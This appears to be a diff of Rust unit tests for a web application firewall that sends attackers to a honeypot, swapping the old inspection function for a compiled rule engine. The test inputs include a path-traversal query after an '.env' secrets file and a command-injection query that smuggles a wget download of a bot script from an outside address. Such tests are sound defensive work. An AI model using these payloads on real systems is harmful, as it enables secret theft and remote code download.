@@ -644,7 +644,7 @@ pub fn into_proxy_response_with_ban_hook(
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::waf::{inspect_request_head, WafVerdict};
+    use crate::waf::{CompiledCrsEngine, WafVerdict};
     use exposure_core::config::{WafConfig, WafMode};
     use http::{HeaderMap, HeaderValue};
     use std::net::IpAddr;
@@ -666,7 +666,8 @@ mod tests {
         let headers = HeaderMap::new();
 
         // 1. WAF triggers on path traversal targeting `.env` and yields WafVerdict::Evilpot
-        let verdict = inspect_request_head(
+        let crs = CompiledCrsEngine::compile(&[], &[]);
+        let verdict = crs.inspect_head(
             &waf_cfg,
             "/download",
             Some("file=../../../../.env"),
@@ -755,7 +756,8 @@ mod tests {
         let ip: IpAddr = "203.0.113.55".parse().unwrap();
         let headers = HeaderMap::new();
         let query = "host=127.0.0.1;wget+http://198.51.100.200/bot.sh+-O+/tmp/bot.sh";
-        let finding = match inspect_request_head(&waf_cfg, "/ping", Some(query), &headers) {
+        let crs = CompiledCrsEngine::compile(&[], &[]);
+        let finding = match crs.inspect_head(&waf_cfg, "/ping", Some(query), &headers) {
             WafVerdict::Evilpot(f) => f,
             other => panic!("expected WafVerdict::Evilpot, got {other:?}"),
         };
